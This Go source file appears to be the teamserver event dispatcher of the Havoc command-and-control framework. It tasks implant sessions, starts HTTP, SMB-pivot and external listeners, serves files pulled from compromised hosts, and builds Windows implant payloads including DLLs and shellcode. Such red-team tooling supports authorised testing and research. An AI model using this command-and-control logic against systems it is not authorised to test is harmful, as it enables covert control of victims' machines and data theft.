package server

import (
	"encoding/json"
	"errors"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"Havoc/pkg/agent"
	"Havoc/pkg/common/builder"
	"Havoc/pkg/events"
	"Havoc/pkg/handlers"
	"Havoc/pkg/logger"
	"Havoc/pkg/logr"
	"Havoc/pkg/packager"
)

// infoString returns the string value stored under Key in Info, or an
// empty string when the key is missing or not a string. operator clients
// (and any compromised one) control these maps, so every read of a
// listener or payload config field must not assume the type.
func infoString(Info map[string]any, Key string) string {
	if val, ok := Info[Key].(string); ok {
		return val
	}

	return ""
}

func (t *Teamserver) DispatchEvent(pk packager.Package) {
	switch pk.Head.Event {

	case packager.Type.Session.Type:

		switch pk.Body.SubEvent {

		case packager.Type.Session.MarkAsDead:
			if AgentID, ok := pk.Body.Info["AgentID"]; ok {
				Agents := t.Agents.Snapshot()
				for i := range Agents {
					if Agents[i].NameID == AgentID {

						if val, ok := pk.Body.Info["Marked"]; ok {
							if val == "Dead" {
								t.Died(Agents[i])
							} else if val == "Alive" {
								Agents[i].Active = true
							}
							t.AgentUpdate(Agents[i])
						}
					}
				}
			}

			break

		case packager.Type.Session.Input:
			var (
				job       *agent.Job
				command   = 0
				AgentType = "Demon"
				err       error
				DemonID   string
				found     = false
			)

			if agentID, ok := pk.Body.Info["DemonID"].(string); ok {
				DemonID = agentID
			} else {
				logger.Debug("AgentID [" + agentID + "] not found")
				return
			}

			Agents := t.Agents.Snapshot()
			for i := range Agents {

				if Agents[i].NameID == DemonID {
					found = true

					// handle demon session input
					// TODO: maybe move to own function ?
					if Agents[i].Info.MagicValue == agent.DEMON_MAGIC_VALUE {

						var (
							Message = new(map[string]string)
							Console = func(AgentID string, Message map[string]string) {
								var (
									out, _ = json.Marshal(Message)
									pk     = events.Demons.DemonOutput(DemonID, agent.HAVOC_CONSOLE_MESSAGE, string(out))
								)

								t.EventAppend(pk)
								t.EventBroadcast("", pk)
							}
						)

						if val, ok := pk.Body.Info["CommandID"].(string); ok {

							if pk.Body.Info["CommandID"] == "Python Plugin" {

								// TODO: move to own function.
								logr.LogrInstance.AddAgentInput("Demon", infoString(pk.Body.Info, "DemonID"), pk.Head.User, infoString(pk.Body.Info, "TaskID"), infoString(pk.Body.Info, "CommandLine"), time.Now().UTC().Format("02/01/2006 15:04:05"))

								if pk.Head.OneTime == "true" {
									return
								}

								var backups = map[string]interface{}{
									"TaskID":      infoString(pk.Body.Info, "TaskID"),
									"DemonID":     DemonID,
									"CommandID":   "",
									"CommandLine": infoString(pk.Body.Info, "CommandLine"),
									"AgentType":   AgentType,
								}

								if _, ok := pk.Body.Info["CommandID"].(string); ok {
									backups["CommandID"] = pk.Body.Info["CommandID"]
								}

								if _, ok := pk.Body.Info["TaskMessage"].(string); ok {
									backups["TaskMessage"] = pk.Body.Info["TaskMessage"]
								}

								// Rebind, don't mutate in place: the package copy
								// appended before dispatch shares this map.
								pk.Body.Info = backups

								t.EventAppend(pk)
								t.EventBroadcast(pk.Head.User, pk)

								return

							} else if pk.Body.Info["CommandID"] == "Teamserver" {

								// TODO: move to own function.
								logr.LogrInstance.AddAgentInput("Demon", infoString(pk.Body.Info, "DemonID"), pk.Head.User, infoString(pk.Body.Info, "TaskID"), infoString(pk.Body.Info, "CommandLine"), time.Now().UTC().Format("02/01/2006 15:04:05"))

								var Command = infoString(pk.Body.Info, "Command")

								if pk.Head.OneTime == "true" {
									return
								}

								var backups = map[string]interface{}{
									"TaskID":      infoString(pk.Body.Info, "TaskID"),
									"DemonID":     DemonID,
									"CommandID":   "",
									"CommandLine": infoString(pk.Body.Info, "CommandLine"),
									"AgentType":   AgentType,
								}

								if _, ok := pk.Body.Info["CommandID"].(string); ok {
									backups["CommandID"] = pk.Body.Info["CommandID"]
								}

								// Rebind, don't mutate in place: the package copy
								// appended before dispatch shares this map.
								pk.Body.Info = backups

								t.EventAppend(pk)
								t.EventBroadcast(pk.Head.User, pk)

								if err = Agents[i].TeamserverTaskPrepare(Command, Console); err != nil {
									Console(Agents[i].NameID, map[string]string{
										"Type":    "Error",
										"Message": "Failed to create Task: " + err.Error(),
									})
									return
								}

								return

							} else {

								// TODO: move to own function.
								command, err = strconv.Atoi(val)
								if err != nil {

									logger.Error("Failed to convert CommandID to integer: " + err.Error())
									command = 0

								} else {
									*Message = make(map[string]string)

									var ClientID string
									ClientID = ""
									t.Clients.Range(func(key, value any) bool {
										client := value.(*Client)
										if client.Username == pk.Head.User {
											ClientID = client.ClientID
											return false
										}
										return true
									})

									job, err = Agents[i].TaskPrepare(command, pk.Body.Info, Message, ClientID, t)
									if err != nil {
										Console(Agents[i].NameID, map[string]string{
											"Type":    "Error",
											"Message": "Failed to create Task: " + err.Error(),
										})
										return
									}

									if job != nil {
										Agents[i].AddJobToQueue(*job)
									}

									if Agents[i].Pivots.Parent != nil {
										logr.LogrInstance.AddAgentInput("Demon", Agents[i].NameID, pk.Head.User, infoString(pk.Body.Info, "TaskID"), infoString(pk.Body.Info, "CommandLine"), time.Now().UTC().Format("02/01/2006 15:04:05"))

									} else {
										logr.LogrInstance.AddAgentInput("Demon", infoString(pk.Body.Info, "DemonID"), pk.Head.User, infoString(pk.Body.Info, "TaskID"), infoString(pk.Body.Info, "CommandLine"), time.Now().UTC().Format("02/01/2006 15:04:05"))
									}

									if pk.Head.OneTime == "true" {
										return
									}

									var backups = map[string]interface{}{
										"TaskID":      infoString(pk.Body.Info, "TaskID"),
										"DemonID":     DemonID,
										"CommandID":   "",
										"CommandLine": infoString(pk.Body.Info, "CommandLine"),
										"AgentType":   AgentType,
									}

									if _, ok := pk.Body.Info["CommandID"].(string); ok {
										backups["CommandID"] = pk.Body.Info["CommandID"]
									}

									// Rebind, don't mutate in place: the package copy
									// appended before dispatch shares this map.
									pk.Body.Info = backups

									t.EventAppend(pk)
									t.EventBroadcast(pk.Head.User, pk)

									if Message != nil {
										Console(Agents[i].NameID, *Message)
									}

									return
								}
							}
						}

					} else {

						for _, a := range t.Service.AgentsSnapshot() {
							if a.MagicValue == fmt.Sprintf("0x%x", Agents[i].Info.MagicValue) {

								// Set agent type
								AgentType = a.Name

								if pk.Body.Info["CommandID"] == "Python Plugin" {
									logr.LogrInstance.AddAgentInput(AgentType, infoString(pk.Body.Info, "DemonID"), pk.Head.User, infoString(pk.Body.Info, "TaskID"), infoString(pk.Body.Info, "CommandLine"), time.Now().UTC().Format("02/01/2006 15:04:05"))

									if pk.Head.OneTime == "true" {
										return
									}

									var backups = map[string]interface{}{
										"TaskID":      infoString(pk.Body.Info, "TaskID"),
										"DemonID":     DemonID,
										"CommandID":   "",
										"CommandLine": infoString(pk.Body.Info, "CommandLine"),
										"AgentType":   AgentType,
									}

									if _, ok := pk.Body.Info["CommandID"].(string); ok {
										backups["CommandID"] = pk.Body.Info["CommandID"]
									}

									if _, ok := pk.Body.Info["TaskMessage"].(string); ok {
										backups["TaskMessage"] = pk.Body.Info["TaskMessage"]
									}

									// Rebind, don't mutate in place: the package copy
									// appended before dispatch shares this map.
									pk.Body.Info = backups

									t.EventAppend(pk)
									t.EventBroadcast(pk.Head.User, pk)

									return

								} else {
									// Send command to agent service. never leak
									// the agent's encryption keys to the service
									// agent (mirrors handlers.go's scrub).
									AgentData := Agents[i].ToMap()
									delete(AgentData, "Encryption")
									a.SendTask(pk.Body.Info, AgentData)

									// log agent input
									logr.LogrInstance.AddAgentInput(a.Name, infoString(pk.Body.Info, "DemonID"), pk.Head.User, infoString(pk.Body.Info, "TaskID"), infoString(pk.Body.Info, "CommandLine"), time.Now().UTC().Format("02/01/2006 15:04:05"))
								}

							}
						}
					}
					break
				}
			}

			if found == false {
				logger.Error(fmt.Sprintf("The AgentID %s was not found", DemonID))
				return
			}

			if pk.Head.OneTime == "true" {
				return
			}

			var backups = map[string]interface{}{
				"TaskID":      infoString(pk.Body.Info, "TaskID"),
				"DemonID":     DemonID,
				"CommandID":   "",
				"CommandLine": infoString(pk.Body.Info, "CommandLine"),
				"AgentType":   AgentType,
			}

			if _, ok := pk.Body.Info["CommandID"].(string); ok {
				backups["CommandID"] = pk.Body.Info["CommandID"]
			}

			// Rebind, don't mutate in place: the package copy
			// appended before dispatch shares this map.
			pk.Body.Info = backups

			t.EventAppend(pk)
			t.EventBroadcast(pk.Head.User, pk)
		}

	case packager.Type.Chat.Type:

		switch pk.Body.SubEvent {

		case packager.Type.Chat.NewMessage:
			t.EventBroadcast("", pk)
			break

		case packager.Type.Chat.NewSession:
			t.EventBroadcast("", pk)
			break

		case packager.Type.Chat.NewListener:
			t.EventBroadcast("", pk)
			break

		}

	case packager.Type.Listener.Type:
		switch pk.Body.SubEvent {

		case packager.Type.Listener.Add:

			var Protocol = infoString(pk.Body.Info, "Protocol")

			switch Protocol {

			case handlers.AGENT_HTTP, handlers.AGENT_HTTPS:

				var (
					HostBind string
					Hosts    []string
					Headers  []string
					Uris     []string
				)

				HostBind = infoString(pk.Body.Info, "HostBind")

				for _, s := range strings.Split(infoString(pk.Body.Info, "Hosts"), ", ") {
					if len(s) > 0 {
						Hosts = append(Hosts, s)
					}
				}

				for _, s := range strings.Split(infoString(pk.Body.Info, "Headers"), "\r\n") {
					if len(s) > 0 {
						Headers = append(Headers, s)
					}
				}

				for _, s := range strings.Split(infoString(pk.Body.Info, "Uris"), ", ") {
					if len(s) > 0 {
						Uris = append(Uris, s)
					}
				}

				var Config = handlers.HTTPConfig{
					Name:         infoString(pk.Body.Info, "Name"),
					Hosts:        Hosts,
					HostBind:     HostBind,
					HostRotation: infoString(pk.Body.Info, "HostRotation"),
					PortBind:     infoString(pk.Body.Info, "PortBind"),
					PortConn:     infoString(pk.Body.Info, "PortConn"),
					Headers:      Headers,
					Uris:         Uris,
					HostHeader:   infoString(pk.Body.Info, "HostHeader"),
					UserAgent:    infoString(pk.Body.Info, "UserAgent"),
					BehindRedir:  t.Profile.Config.Demon != nil && t.Profile.Config.Demon.TrustXForwardedFor,
				}

				if val, ok := pk.Body.Info["Proxy Enabled"].(string); ok {
					Config.Proxy.Enabled = false

					if val == "true" {
						Config.Proxy.Enabled = true

						if val, ok = pk.Body.Info["Proxy Type"].(string); ok {
							Config.Proxy.Type = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, infoString(pk.Body.Info, "Name"), errors.New("proxy type not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
						}

						if val, ok = pk.Body.Info["Proxy Host"].(string); ok {
							Config.Proxy.Host = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, infoString(pk.Body.Info, "Name"), errors.New("proxy host not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
						}

						if val, ok = pk.Body.Info["Proxy Port"].(string); ok {
							Config.Proxy.Port = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, infoString(pk.Body.Info, "Name"), errors.New("proxy port not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}

						if val, ok = pk.Body.Info["Proxy Username"].(string); ok {
							Config.Proxy.Username = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, infoString(pk.Body.Info, "Name"), errors.New("proxy username not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}

						if val, ok = pk.Body.Info["Proxy Password"].(string); ok {
							Config.Proxy.Password = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, infoString(pk.Body.Info, "Name"), errors.New("proxy password not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}
					}
				}

				if infoString(pk.Body.Info, "Secure") == "true" {
					Config.Secure = true
				}

				if err := t.ListenerStart(handlers.LISTENER_HTTP, Config); err != nil {
					t.Clients.Range(func(key, value any) bool {
						id := key.(string)
						client := value.(*Client)
						if client.Username == pk.Head.User {
							err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, infoString(pk.Body.Info, "Name"), err))
							if err != nil {
								logger.Error("Failed to send Event: " + err.Error())
							}
							return false
						}
						return true
					})
				}

				break

			case handlers.AGENT_PIVOT_SMB:
				var (
					SmdConfig handlers.SMBConfig
					found     bool
				)

				SmdConfig.Name, found = pk.Body.Info["Name"].(string)
				if !found {
					SmdConfig.Name = ""
				}

				SmdConfig.PipeName, found = pk.Body.Info["PipeName"].(string)
				if !found {
					SmdConfig.PipeName = ""
				}

				if err := t.ListenerStart(handlers.LISTENER_PIVOT_SMB, SmdConfig); err != nil {
					t.Clients.Range(func(key, value any) bool {
						id := key.(string)
						client := value.(*Client)
						if client.Username == pk.Head.User {
							err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, infoString(pk.Body.Info, "Name"), err))
							if err != nil {
								logger.Error("Failed to send Event: " + err.Error())
							}
							return false
						}
						return true
					})
				}

				break

			case handlers.AGENT_EXTERNAL:
				var (
					ExtConfig handlers.ExternalConfig
					found     bool
				)

				ExtConfig.Name, found = pk.Body.Info["Name"].(string)
				if !found {
					ExtConfig.Name = ""
				}

				ExtConfig.Endpoint, found = pk.Body.Info["Endpoint"].(string)
				if !found {
					logger.Error("Listener SMB Pivot: Endpoint not specified")
					return
				}

				if err := t.ListenerStart(handlers.LISTENER_EXTERNAL, ExtConfig); err != nil {
					t.Clients.Range(func(key, value any) bool {
						id := key.(string)
						client := value.(*Client)
						if client.Username == pk.Head.User {
							err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, infoString(pk.Body.Info, "Name"), err))
							if err != nil {
								logger.Error("Failed to send Event: " + err.Error())
							}
							return false
						}
						return true
					})
				}

				break

			default:

				// check if the service endpoint is up and available
				if t.Service != nil {

					for _, listener := range t.Service.ListenersSnapshot() {

						if Protocol == listener.Name {

							var (
								ListenerName string
								err          error
							)

							// retrieve the listener name
							if val, ok := pk.Body.Info["Name"].(string); ok {
								ListenerName = val
							}

							// try to start the listener.
							if err = listener.Start(pk.Body.Info); err != nil {
								t.EventListenerError(ListenerName, err)
								// a failed listener must not be appended:
								// dead entries would still match by name in
								// the payload-build listener lookup
								return
							}

							// append the listener to the teamserver listener array
							t.ListenersMutex.Lock()

							// refuse duplicate listener names: payload-build
							// lookup matches listeners by name
							for _, existing := range t.Listeners {
								if existing.Name == ListenerName {
									t.ListenersMutex.Unlock()
									t.EventListenerError(ListenerName, errors.New("listener \""+ListenerName+"\" already exists"))
									return
								}
							}

							t.Listeners = append(t.Listeners, &Listener{
								Name: ListenerName,
								Type: handlers.LISTENER_SERVICE,
								Config: handlers.Service{
									Service: listener,
									Info:    pk.Body.Info,
								},
							})
							t.ListenersMutex.Unlock()

							// break from this switch
							return
						}

					}

				}

				// didn't found the protocol type so just abort
				logger.Error("Listener Type not found: ", Protocol)

				break
			}

			break

		case packager.Type.Listener.Remove:

			if val, ok := pk.Body.Info["Name"].(string); ok {
				t.ListenerRemove(val)

				var p = events.Listener.ListenerRemove(val)

				t.EventAppend(p)
				t.EventBroadcast("", p)
			}

			break

		case packager.Type.Listener.Edit:

			var Protocol = infoString(pk.Body.Info, "Protocol")
			switch Protocol {

			case handlers.AGENT_HTTP, handlers.AGENT_HTTPS:
				var (
					HostBind string
					Hosts    []string
					Headers  []string
					Uris     []string
				)

				HostBind = infoString(pk.Body.Info, "HostBind")

				for _, s := range strings.Split(infoString(pk.Body.Info, "Hosts"), ", ") {
					if len(s) > 0 {
						Hosts = append(Hosts, s)
					}
				}

				for _, s := range strings.Split(infoString(pk.Body.Info, "Headers"), "\r\n") {
					if len(s) > 0 {
						Headers = append(Headers, s)
					}
				}

				for _, s := range strings.Split(infoString(pk.Body.Info, "Uris"), ", ") {
					if len(s) > 0 {
						Uris = append(Uris, s)
					}
				}

				var Config = handlers.HTTPConfig{
					Name:         infoString(pk.Body.Info, "Name"),
					Hosts:        Hosts,
					HostBind:     HostBind,
					HostRotation: infoString(pk.Body.Info, "HostRotation"),
					PortBind:     infoString(pk.Body.Info, "PortBind"),
					PortConn:     infoString(pk.Body.Info, "PortConn"),
					Headers:      Headers,
					Uris:         Uris,
					HostHeader:   infoString(pk.Body.Info, "HostHeader"),
					UserAgent:    infoString(pk.Body.Info, "UserAgent"),
				}

				if val, ok := pk.Body.Info["Proxy Enabled"].(string); ok {
					Config.Proxy.Enabled = false

					if val == "true" {
						Config.Proxy.Enabled = true

						if val, ok = pk.Body.Info["Proxy Type"].(string); ok {
							Config.Proxy.Type = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, infoString(pk.Body.Info, "Name"), errors.New("proxy type not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
						}

						if val, ok = pk.Body.Info["Proxy Host"].(string); ok {
							Config.Proxy.Host = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, infoString(pk.Body.Info, "Name"), errors.New("proxy host not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
						}

						if val, ok = pk.Body.Info["Proxy Port"].(string); ok {
							Config.Proxy.Port = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, infoString(pk.Body.Info, "Name"), errors.New("proxy port not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}

						if val, ok = pk.Body.Info["Proxy Username"].(string); ok {
							Config.Proxy.Username = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, infoString(pk.Body.Info, "Name"), errors.New("proxy username not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}

						if val, ok = pk.Body.Info["Proxy Password"].(string); ok {
							Config.Proxy.Password = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, infoString(pk.Body.Info, "Name"), errors.New("proxy password not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}
					}
				}

				if infoString(pk.Body.Info, "Secure") == "true" {
					Config.Secure = true
				}

				t.ListenerEdit(handlers.LISTENER_HTTP, Config)

				var p = events.Listener.ListenerEdit(handlers.LISTENER_HTTP, &Config)

				t.EventAppend(p)
				t.EventBroadcast("", p)

				break

			}

			break
		}

	case packager.Type.Loot.Type:

		switch pk.Body.SubEvent {
		case packager.Type.Loot.GetFile:
			var (
				ClientID string
			)

			AgentID, ok := pk.Body.Info["AgentID"].(string)
			if !ok || len(AgentID) == 0 {
				logger.Error("Loot GetFile: malformed package (AgentID)")
				return
			}

			FileName, ok := pk.Body.Info["FileName"].(string)
			if !ok || len(FileName) == 0 {
				logger.Error("Loot GetFile: malformed package (FileName)")
				return
			}

			t.Clients.Range(func(key, value any) bool {
				Client := value.(*Client)
				if Client.Username == pk.Head.User {
					ClientID = Client.ClientID
					return false
				}
				return true
			})

			if len(ClientID) == 0 {
				return
			}

			// downloads are stored under <loot>/agents/<AgentID>/Download/,
			// preserving the remote directory structure. find the newest file
			// matching the requested base name.
			var (
				DownloadDir = filepath.Clean(logr.LogrInstance.AgentPath + "/" + AgentID + "/Download")
				FoundPath   string
				FoundTime   time.Time
			)

			if !strings.HasPrefix(DownloadDir, filepath.Clean(logr.LogrInstance.AgentPath)+string(os.PathSeparator)) {
				logger.Error("Loot GetFile: path traversal attempt (AgentID): " + AgentID)
				t.SendEvent(ClientID, events.Loot.SendError("Invalid agent id"))
				return
			}

			err := filepath.WalkDir(DownloadDir, func(path string, d fs.DirEntry, err error) error {
				if err != nil {
					return err
				}
				if !d.IsDir() && d.Name() == FileName {
					if info, err := d.Info(); err == nil && info.ModTime().After(FoundTime) {
						FoundPath = path
						FoundTime = info.ModTime()
					}
				}
				return nil
			})

			if err != nil || len(FoundPath) == 0 {
				logger.Error("Loot GetFile: file not found: " + FileName)
				t.SendEvent(ClientID, events.Loot.SendError("File not found on teamserver: "+FileName))
				return
			}

			// the file is sent base64-encoded inside a JSON websocket
			// package, so refuse to read absurdly large files into memory.
			if info, err := os.Stat(FoundPath); err == nil && info.Size() > 64*1024*1024 {
				logger.Error("Loot GetFile: file too large: " + FoundPath)
				t.SendEvent(ClientID, events.Loot.SendError("File too large to download via the client: "+FileName))
				return
			}

			Content, err := os.ReadFile(FoundPath)
			if err != nil {
				logger.Error("Loot GetFile: failed to read file: " + err.Error())
				t.SendEvent(ClientID, events.Loot.SendError("Failed to read file: "+FileName))
				return
			}

			err = t.SendEvent(ClientID, events.Loot.SendFile(AgentID, FileName, Content))
			if err != nil {
				logger.Error("Loot GetFile: couldn't send event: " + err.Error())
			}
		}

	case packager.Type.Gate.Type:

		switch pk.Body.SubEvent {
		case packager.Type.Gate.Stageless:
			var (
				AgentType      = infoString(pk.Body.Info, "AgentType")
				ListenerName   = infoString(pk.Body.Info, "Listener")
				Arch           = infoString(pk.Body.Info, "Arch")
				Format         = infoString(pk.Body.Info, "Format")
				Config         = infoString(pk.Body.Info, "Config")
				SendConsoleMsg func(MsgType, Message string)
				ClientID       string
			)

			t.Clients.Range(func(key, value any) bool {
				Client := value.(*Client)
				if Client.Username == pk.Head.User {
					ClientID = Client.ClientID
					return false
				}
				return true
			})

			SendConsoleMsg = func(MsgType, Message string) {
				err := t.SendEvent(ClientID, events.Gate.SendConsoleMessage(MsgType, Message))
				if err != nil {
					logger.Error("Couldn't send Event: " + err.Error())
					return
				}
			}

			if AgentType == "Demon" {
				go func() {
					var PayloadBuilder *builder.Builder

					defer func() {
						// a panic in this goroutine would take down the whole
						// teamserver; recover it, tell the operator, and still
						// clean up the temp build directory
						if r := recover(); r != nil {
							logger.Error(fmt.Sprintf("Recovered from panic during payload build: %v", r))
							SendConsoleMsg("Error", "Payload build failed unexpectedly (teamserver recovered from an internal error)")
						}
						if PayloadBuilder != nil {
							PayloadBuilder.DeletePayload()
						}
					}()

					var ConfigMap = make(map[string]any)

					err := json.Unmarshal([]byte(Config), &ConfigMap)
					if err != nil {
						logger.Error("Failed to Unmarshal json to object: " + err.Error())
						return
					}

					PayloadBuilder = builder.NewBuilder(builder.BuilderConfig{
						Compiler64: t.Settings.Compiler64,
						Compiler86: t.Settings.Compiler32,
						Nasm:       t.Settings.Nasm,
						DebugDev:   t.Flags.Server.DebugDev,
						SendLogs:   t.Flags.Server.SendLogs,
					})

					PayloadBuilder.ClientId = ClientID

					if PayloadBuilder.ClientId == "" {
						logger.Error("Couldn't find the Client")
						return
					}

					PayloadBuilder.SendConsoleMessage = SendConsoleMsg

					err = PayloadBuilder.SetConfig(Config)
					if err != nil {
						return
					}

					if Arch == "x64" {
						PayloadBuilder.SetArch(builder.ARCHITECTURE_X64)
					} else {
						PayloadBuilder.SetArch(builder.ARCHITECTURE_X86)
					}

					var Ext string
					if Arch == "x64" {
						Ext = ".x64"
					} else {
						Ext = ".x86"
					}
					logger.Debug(Format)
					if Format == "Windows Exe" {
						PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_EXE)
						Ext += ".exe"
					} else if Format == "Windows Service Exe" {
						PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_SERVICE_EXE)
						Ext += ".exe"
					} else if Format == "Windows Dll" {
						PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_DLL)
						Ext += ".dll"
					} else if Format == "Windows Reflective Dll" {
						PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_REFLECTIVE_DLL)
						Ext += ".dll"
					} else if Format == "Windows Shellcode" {
						PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_RAW_BINARY)
						Ext += ".bin"
					} else {
						logger.Error("Unknown Format: " + Format)
						return
					}

					t.ListenersMutex.RLock()
					for i := 0; i < len(t.Listeners); i++ {
						if t.Listeners[i].Name == ListenerName {
							PayloadBuilder.SetListener(t.Listeners[i].Type, t.Listeners[i].Config)
						}
					}
					t.ListenersMutex.RUnlock()

					PayloadBuilder.SetExtension(Ext)

					if t.Profile.Config.Demon != nil && t.Profile.Config.Demon.Binary != nil {
						PayloadBuilder.SetPatchConfig(t.Profile.Config.Demon.Binary)
					}

					if PayloadBuilder.Build() {
						pal := PayloadBuilder.GetPayloadBytes()
						if len(pal) > 0 {
							err := t.SendEvent(PayloadBuilder.ClientId, events.Gate.SendStageless("demon"+Ext, pal))
							if err != nil {
								logger.Error("Error while sending event: " + err.Error())
							}
						}
					}
				}()
			} else {
				// send to Services
				for _, Agent := range t.Service.AgentsSnapshot() {
					if Agent.Name == AgentType {
						var ConfigMap = make(map[string]any)

						err := json.Unmarshal([]byte(Config), &ConfigMap)
						if err != nil {
							logger.Error("Failed to Unmarshal json to object: " + err.Error())
							SendConsoleMsg("Error", "Failed to Unmarshal json to object: "+err.Error())
							return
						}

						var Options = map[string]any{
							"Listener": t.ListenerGetInfo(ListenerName),
							"Arch":     Arch,
							"Format":   Format,
						}

						Agent.SendAgentBuildRequest(ClientID, ConfigMap, Options)
					}
				}

			}
		}
	}
}
